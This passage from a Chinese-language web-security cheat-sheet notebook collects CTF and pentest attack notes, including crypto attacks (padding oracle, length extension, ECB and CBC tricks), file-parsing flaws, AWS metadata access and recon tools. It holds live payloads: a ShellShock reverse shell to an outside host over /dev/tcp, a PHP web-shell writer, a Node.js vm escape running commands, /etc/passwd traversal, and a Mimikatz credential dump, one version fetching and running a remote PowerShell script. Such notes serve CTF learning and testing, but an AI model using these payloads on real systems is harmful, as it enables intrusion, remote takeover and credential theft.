    "清空目標 Cache\n",
    "    送 POST 請求\n",
    "查詢內容\n",
    "    <link rel=prerender href=\"victim.com\">\n",
    "檢查是否 Cache 該內容\n",
    "    Referrer 設超長，然後訪問該資源\n",
    "    有 cache => 顯示資源\n",
    "    沒 cache => 抓不到資源"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 密碼學"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PRNG"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "php 7.1.0後 rand()和srand()已經等同mt_rand()和mt_srand()\n",
    "\n",
    "測試結果：https://3v4l.org/PIUEo\n",
    "php > 4.2.0 會自動對srand()和mt_srand()播種\n",
    "\n",
    "只進行一次seed，不會每次rand()都seed\n",
    "可以通過已知的random結果，去推算隨機數種子，然後就可以推算整個隨機數序列\n",
    "\n",
    "實際應用上可能會碰到連上的不是同個process，可以用Keep-Alive 來確保連上同個php process(只會seed一次)\n",
    "\n",
    "7.1以前rand()使用libc random()，其核心為： state[i] = state[i-3] + state[i-31]\n",
    "\n",
    "所以只要有31個連續隨機數就能預測接下來的隨機數\n",
    "後來rand() alias成mt_rand()，採用的是Mersenne Twister算法\n",
    "Example: HITCON 2015 - Giraffe’s Coffee"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ECB mode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Cut and Paste Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "每個Block加密方式都一樣，所以可以把Block隨意排列\n",
    "舉例： user=kaibro;role=user\n",
    "    假設Block長度為8\n",
    "    構造一下user: (|用來區隔Block)\n",
    "        user=aaa|admin;ro|le=user\n",
    "        user=aaa|aa;role=|user\n",
    "    排列一下：(上面每塊加密後的Block都已知)\n",
    "        user=aaa|aa;role=|admin;ro\n",
    "Example: AIS3 2017 pre-exam"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Encryption Oracle Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ECB(K, A + B + C)的運算結果可知\n",
    "    B可控\n",
    "    K, A, C未知\n",
    "C的內容可以透過以下方法爆出來：\n",
    "    找出最小的長度L\n",
    "    使得將B改成L個a，該段pattern剛好重複兩次\n",
    "        ...bbbb bbaa aaaa aaaa cccc ...\n",
    "        ...???? ???? 5678 5678 ???? ...\n",
    "    改成L-1個a，可得到ECB(K, \"aa...a\" + C[0])這個Block的內容\n",
    "    C[0]可爆破求得，後面也依此類推\n",
    "常見發生場景：Cookie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CBC mode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bit Flipping Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "假設IV為A、中間值為B (Block Decrypt後結果)、明文為C\n",
    "CBC mode解密時，A XOR B = C\n",
    "若要使輸出明文變X\n",
    "修改A為A XOR C XOR X\n",
    "則原本式子變成(A XOR C XOR X) XOR B = X"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Padding Oracle Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### PKCS#7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Padding方式：不足x個Byte，就補x個x\n",
    "    例如：Block長度8\n",
    "    AA AA AA AA AA AA AA 01\n",
    "    AA AA AA AA AA AA 02 02\n",
    "    AA AA AA AA AA 03 03 03\n",
    "    ...\n",
    "    08 08 08 08 08 08 08 08\n",
    "在常見情況下，如果解密出來發現Padding是爛的，會噴Exception或Error\n",
    "    例如：HTTP 500 Internal Server Error\n",
    "    須注意以下這類情況，不會噴錯：\n",
    "    AA AA AA AA AA AA 01 01\n",
    "    AA AA 02 02 02 02 02 02"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 原理"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CBC mode下，前一塊密文會當作當前這塊的IV，做XOR\n",
    "如果構造A||B去解密 (A, B是密文Block)\n",
    "此時，A會被當作B的IV，B會被解成D(B) XOR A\n",
    "可以透過調整A，使得Padding變合法，就可以得到D(B)的值\n",
    "    例如：要解最後1 Byte\n",
    "    想辦法讓最後解出來變成01結尾\n",
    "    運氣不好時，可能剛好碰到02 02結尾，可以調整一下A倒數第2 Byte\n",
    "    D(B)[-1] XOR A[-1] = 01\n",
    "    D(B)[-1] = A[-1] XOR 01\n",
    "    有最後1 Byte就可以依此類推，調整倒數第2 Byte\n",
    "D(B) XOR C就能得到明文 (C為前一塊真正的密文)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Length Extension Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "很多hash算法都可能存在此攻擊，例如md5, sha1, sha256...\n",
    "主要是因為他們都使用Merkle-Damgard hash construction\n",
    "會依照64 Byte分組，不足會padding\n",
    "    1 byte的0x80+一堆0x00+8 bytes的長度\n",
    "IV是寫死的，且每一組輸出結果會當下一組的輸入\n",
    "攻擊條件： (這裏md5換成sha1, sha256...也通用)\n",
    "    已知md5(secret+message)\n",
    "    已知secret長度\n",
    "    已知message內容\n",
    "符合三個條件就能構造md5(secret+message+padding+任意字串)\n",
    "工具 - hashpump\n",
    "    基本用法：\n",
    "        輸入md5(secret+message)的值\n",
    "        輸入message的值\n",
    "        輸入secert長度\n",
    "        輸入要加在後面的字串\n",
    "        最後會把md5(secret+message+padding+任意字串)和message+padding+任意字串噴給你"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 杂项"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Information leak"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    ".git / .svn\n",
    "robots.txt\n",
    "/.well-known\n",
    ".DS_Store\n",
    ".htaccess\n",
    ".pyc\n",
    "package.json\n",
    "server-status\n",
    "crossdomain.xml\n",
    "admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/\n",
    "xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps\n",
    "/WEB-INF/web.xml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 文件解析漏洞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Apache"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "shell.php.ggininder\n",
    "shell.php%0a\n",
    "    httpd 2.4.0 to 2.4.29\n",
    "    CVE-2017-15715"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IIS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IIS < 7\n",
    "    a.asp/user.jpg\n",
    "    user.asp;aa.jpg"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Nginx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "nginx < 8.03\n",
    "    cgi.fix_pathinfo=1\n",
    "    Fast-CGI開啟狀況下\n",
    "    kaibro.jpg: <?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>\n",
    "    訪問kaibro.jpg/.php生成shell.php"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## AWS常見漏洞"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "S3 bucket權限配置錯誤\n",
    "    nslookup判斷\n",
    "        nslookup 87.87.87.87\n",
    "        s3-website-us-west-2.amazonaws.com.\n",
    "確認bucket\n",
    "    訪問bucketname.s3.amazonaws.com\n",
    "    成功會返回bucket XML資訊\n",
    "awscli工具\n",
    "    列目錄 aws s3 ls s3://bucketname/ --region regionname\n",
    "    下載 aws sync s3://bucketname/ localdir --region regionname\n",
    "metadata\n",
    "    http://169.254.169.254/latest/meta-data/\n",
    "    Tool\n",
    "        https://andresriancho.github.io/nimbostratus/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 常見Port服務"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "http://packetlife.net/media/library/23/common_ports.pdf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## php -i | grep \"Loaded Configuration File\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "列出php.ini路徑"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## curl -i -X OPTIONS 'http://evil.com/'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ShellShock"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "() { :; }; echo vulnerable\n",
    "() { :a; }; /bin/cat /etc/passwd\n",
    "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## X-forwarded-for偽造來源IP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DNS Zone Transfer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dig @1.2.3.4 abc.com axfr\n",
    "    DNS Server: 1.2.3.4\n",
    "    Test Domain: abc.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## IIS 短檔名列舉"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Windows 8.3 格式: administrator 可以簡寫成 admini~1\n",
    "原理：短檔名存在或不存在，伺服器回應內容不同\n",
    "Tool: https://github.com/irsdl/IIS-ShortName-Scanner\n",
    "    java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## NodeJS unicode failure"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "內部使用UCS-2編碼\n",
    "ＮＮ => ..\n",
    "    Ｎ 即 \\xff\\x2e\n",
    "    轉型時捨棄第一個Byte"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 特殊的CRLF Injection繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%E5%98%8A\n",
    "原始的Unicode碼為U+560A\n",
    "raw bytes: 0x56, 0x0A"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MySQL utf8 v.s. utf8mb4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MySQL utf8編碼只支援3 bytes\n",
    "若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷\n",
    "CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Nginx internal繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "X-Accel-Redirect\n",
    "Document\n",
    "Example:\n",
    "    Olympic CTF 2014 - CURLing\n",
    "    MidnightSun CTF 2019 - bigspin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Nginx目錄穿越漏洞"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "常見於Nginx做Reverse Proxy的狀況\n",
    "location /files {\n",
    "    alias /home/\n",
    "}\n",
    "因為/files沒有加上結尾/，而/home/有\n",
    "所以/files../可以訪問上層目錄\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Nginx add_header"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "預設當 repsponse 是 200, 201, 204, 206, 301, 302, 303, 304, 307, or 308 時，add_header才會設定 header\n",
    "e.g. Codegate 2020 - CSP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Javascript大小寫特性"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"ı\".toUpperCase() == 'I'\n",
    "\"ſ\".toUpperCase() == 'S'\n",
    "\"K\".toLowerCase() == 'k'\n",
    "https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Node.js目錄穿越漏洞"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CVE-2017-14849\n",
    "影響: 8.5.0版\n",
    "/static/../../../foo/../../../../etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Node.js vm escape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()\n",
    "CONFidence CTF 2020 - TempleJS\n",
    "    Only allow /^[a-zA-Z0-9 ${}`]+$/g\n",
    "    Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` ``"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Apache Tomcat Session操縱漏洞"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "預設session範例頁面/examples/servlets /servlet/SessionExample\n",
    "可以直接對Session寫入"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## polyglot image+.htaccess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "XBM格式有定義在exif_imagetype()中\n",
    "符合.htaccess格式\n",
    "Insomnihack CTF\n",
    "    #define gg_width 1337\n",
    "    #define gg_height 1337\n",
    "    AddType application/x-httpd-php .asp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## AutoBinding / Mass Assignment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Mass_Assignment_Cheat_Sheet https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md\n",
    "Spring MVC\n",
    "    @ModelAttribute\n",
    "    會將Client端傳來的參數(GET/POST)綁定到指定Object中，並自動將此Object加到ModelMap中\n",
    "    Example\n",
    "    @RequestMapping(value = \"/home\", method = RequestMethod.GET)\n",
    "        public String home(@ModelAttribute User user, Model model) {\n",
    "            if (showSecret){\n",
    "                model.addAttribute(\"firstSecret\", firstSecret);\n",
    "            }\n",
    "            return \"home\";\n",
    "        }\n",
    "    Example 2:\n",
    "    justiceleague https://github.com/GrrrDog/ZeroNights-HackQuest-2016\n",
    "    Example 3: VolgaCTF 2019 - shop https://github.com/w181496/CTF/tree/master/volgactf2019_quals/shop\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## tcpdump"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "-i 指定網卡，不指定則監控所有網卡\n",
    "-s 默認只抓96bytes，可以-s指定更大數值\n",
    "-w 指定輸出檔\n",
    "host 指定主機(ip or domain)\n",
    "dst, src 來源或目的端\n",
    "port指定端口\n",
    "tcp, udp, icmp 指定協議\n",
    "example\n",
    "    來源192.168.1.34且目的端口為80\n",
    "    tcpdump -i eth0 src 192.168.1.34 and dst port 80\n",
    "    來源192.168.1.34且目的端口是22或3389\n",
    "    tcpdump -i eth0 'src 192.168.1.34 and (dst port 22 or 3389)'\n",
    "    保存檔案，可以後續用wireshark分析\n",
    "    tcpdump -i eth0 src kaibro.tw -w file.cap"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Tool & Online Website"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Information gathering"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://pentest-tools.com/\n",
    "\n",
    "https://www.shodan.io/\n",
    "\n",
    "https://www.zoomeye.org/\n",
    "\n",
    "https://censys.io\n",
    "\n",
    "https://crt.sh/\n",
    "\n",
    "http://webscan.cc/\n",
    "\n",
    "https://x.threatbook.cn/\n",
    "\n",
    "https://dnsdumpster.com/\n",
    "\n",
    "https://www.domainiq.com/reverse_whois\n",
    "\n",
    "https://www.yougetsignal.com/tools/web-sites-on-web-server/\n",
    "\n",
    "https://www.robtex.com/dns-lookup/\n",
    "\n",
    "https://phpinfo.me/bing.php\n",
    "\n",
    "https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project\n",
    "\n",
    "https://github.com/laramies/theHarvester\n",
    "\n",
    "https://github.com/drwetter/testssl.sh\n",
    "\n",
    "https://github.com/urbanadventurer/WhatWeb\n",
    "\n",
    "https://buckets.grayhatwarfare.com/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hash Crack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://cmd5.com\n",
    "\n",
    "https://somd5.com/\n",
    "\n",
    "https://crackstation.net/\n",
    "\n",
    "https://hashkiller.co.uk/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 其它"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://3v4l.org/\n",
    "\n",
    "php eval\n",
    "\n",
    "\n",
    "https://github.com/denny0223/scrabble\n",
    "\n",
    "git\n",
    "\n",
    "\n",
    "https://github.com/lijiejie/ds_store_exp\n",
    "\n",
    ".DS_Store\n",
    "\n",
    "\n",
    "https://github.com/kost/dvcs-ripper\n",
    "\n",
    "git / svn / hg / cvs ...\n",
    "\n",
    "\n",
    "http://www.factordb.com/\n",
    "\n",
    "\n",
    "unicode converter\n",
    "\n",
    "https://www.branah.com/unicode-converter\n",
    "\n",
    "\n",
    "PHP混淆 / 加密\n",
    "\n",
    "http://enphp.djunny.com/\n",
    "\n",
    "http://www.phpjm.net/\n",
    "\n",
    "\n",
    "https://github.com/PowerShellMafia/PowerSploit\n",
    "\n",
    "https://github.com/swisskyrepo/PayloadsAllTheThings/\n",
    "\n",
    "http://xssor.io\n",
    "\n",
    "https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt\n",
    "\n",
    "XSS Payloads\n",
    "\n",
    "DNSLog\n",
    "\n",
    "http://ceye.io\n",
    "\n",
    "https://www.t00ls.net/dnslog.html\n",
    "\n",
    "http://dnsbin.zhack.ca/\n",
    "\n",
    "http://requestbin.net/dns\n",
    "\n",
    "DNS rebinding\n",
    "\n",
    "rebind.network\n",
    "\n",
    "  #butit still works\n",
    "  \n",
    "  A.192.168.1.1.forever.rebind.network\n",
    "  \n",
    "  #alternate between localhost and 10.0.0.1 forever\n",
    "  \n",
    "  A.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network\n",
    "  \n",
    "  #first respond with 192.168.1.1 then 192.168.1.2. Now respond 192.168.1.3forever.\n",
    "  \n",
    "  A.192.168.1.1.1time.192.168.1.2.2times.192.168.1.3.forever.rebind.network\n",
    "  \n",
    "  #respond with 52.23.194.42 the first time, then whatever `whonow--default-address`\n",
    "  \n",
    "  #isset to forever after that (default: 127.0.0.1)\n",
    "  \n",
    "  A.52.23.194.42.1time.rebind.network\n",
    "  \n",
    "rbndr.us\n",
    "\n",
    "36573657.7f000001.rbndr.us\n",
    "\n",
    "https://r12a.github.io/apps/encodings/\n",
    "\n",
    "Encoding converter\n",
    "\n",
    "http://tool.leavesongs.com/\n",
    "\n",
    "Mimikatz\n",
    "\n",
    "mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt\n",
    "\n",
    "powershell 無文件: powershell \"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds\"\n",
    "\n",
    "\n",
    "WASM\n",
    "\n",
    "https://wasdk.github.io/WasmFiddle/\n",
    "\n",
    "https://webassembly.studio/\n",
    "\n",
    "https://github.com/WebAssembly/wabt\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "256px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
